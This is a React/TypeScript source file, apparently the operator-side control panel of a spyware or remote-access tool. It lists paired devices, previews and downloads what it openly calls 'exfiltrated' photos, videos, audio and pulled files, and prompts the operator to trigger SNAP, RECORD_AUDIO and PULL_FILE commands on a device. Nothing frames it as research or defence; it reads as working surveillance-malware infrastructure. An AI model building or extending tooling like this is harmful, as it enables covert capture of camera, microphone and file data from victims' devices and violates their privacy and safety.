import { useEffect, useState } from "react";
import { useDevices } from "../devices";

type FileEntry = { id: string; name: string; mime: string; size: number; complete: boolean; createdAt: number; completedAt: number; sha256: string };

export default function FilesPage({ token, onTokenExpired }: { token: string | null; onTokenExpired?: () => void }) {
  const { devices } = useDevices(token, onTokenExpired);
  const [selectedId, setSelectedId] = useState<string | null>(null);
  useEffect(() => { if (!selectedId && devices[0]) setSelectedId(devices[0].deviceId); }, [devices, selectedId]);
  const [files, setFiles] = useState<FileEntry[]>([]);
  const [filter, setFilter] = useState("");

  useEffect(() => { if (selectedId && token) void refresh(); }, [selectedId, token]);

  async function refresh() {
    if (!token || !selectedId) return;
    const r = await fetch(`/api/v2/devices/${selectedId}/files`, { headers: { Authorization: `Bearer ${token}` } });
    if (r.ok) { const j = await r.json(); setFiles(j.files || []); }
  }

  async function del(id: string) {
    if (!token || !selectedId) return;
    if (!confirm("Delete this file from the server?")) return;
    await fetch(`/api/v2/devices/${selectedId}/files/${id}`, { method: "DELETE", headers: { Authorization: `Bearer ${token}` } });
    void refresh();
  }

  const filtered = files.filter((f) => !filter || f.name.toLowerCase().includes(filter.toLowerCase()) || f.mime.includes(filter));

  return (
    <section className="view">
      <div className="view-head">
        <div>
          <h2>Files</h2>
          <p className="muted">Reassembled exfiltrated files — photos, videos, audio, and arbitrary pulls</p>
        </div>
        <span className="muted">{files.length} file{files.length === 1 ? "" : "s"}</span>
      </div>

      {devices.length === 0 ? (
        <p className="muted">No paired devices yet.</p>
      ) : (
        <>
          <div style={{ display: "flex", gap: 8, marginBottom: 12 }}>
            <select className="select" value={selectedId ?? ""} onChange={(e) => setSelectedId(e.target.value)}>
              {devices.map((d) => <option key={d.deviceId} value={d.deviceId}>{d.deviceId}</option>)}
            </select>
            <input className="select" placeholder="Filter by name or mime…" value={filter} onChange={(e) => setFilter(e.target.value)} />
            <button className="btn-ghost" onClick={() => void refresh()}>Refresh</button>
          </div>

          <div className="files-grid">
            {filtered.map((f) => (
              <article key={f.id} className="file-card">
                <div className="file-preview">
                  {f.mime.startsWith("image/") ? (
                    <img src={`/api/v2/devices/${selectedId}/files/${f.id}`} alt={f.name} loading="lazy" />
                  ) : f.mime.startsWith("video/") ? (
                    <video src={`/api/v2/devices/${selectedId}/files/${f.id}`} controls preload="metadata" />
                  ) : f.mime.startsWith("audio/") ? (
                    <audio src={`/api/v2/devices/${selectedId}/files/${f.id}`} controls />
                  ) : (
                    <div className="file-icon">📄</div>
                  )}
                </div>
                <div className="file-meta">
                  <h4>{f.name}</h4>
                  <p className="muted">{f.mime} · {fmtSize(f.size)}</p>
                  <p className="muted">{f.complete ? "✓ complete" : "incomplete"} · {new Date(f.completedAt || f.createdAt).toLocaleString()}</p>
                  <div style={{ display: "flex", gap: 6 }}>
                    <a className="btn-ghost" href={`/api/v2/devices/${selectedId}/files/${f.id}?download=1`}>Download</a>
                    <button className="btn-ghost danger" onClick={() => del(f.id)}>Delete</button>
                  </div>
                </div>
              </article>
            ))}
            {filtered.length === 0 && <p className="muted">No files yet. Trigger SNAP / RECORD_AUDIO / PULL_FILE on the device.</p>}
          </div>
        </>
      )}
    </section>
  );
}

const fmtSize = (n: number) => {
  if (!n) return "0 B";
  const u = ["B","KB","MB","GB"]; let i = 0; let v = n;
  while (v >= 1024 && i < u.length - 1) { v /= 1024; i++; }
  return `${v.toFixed(1)} ${u[i]}`;
};
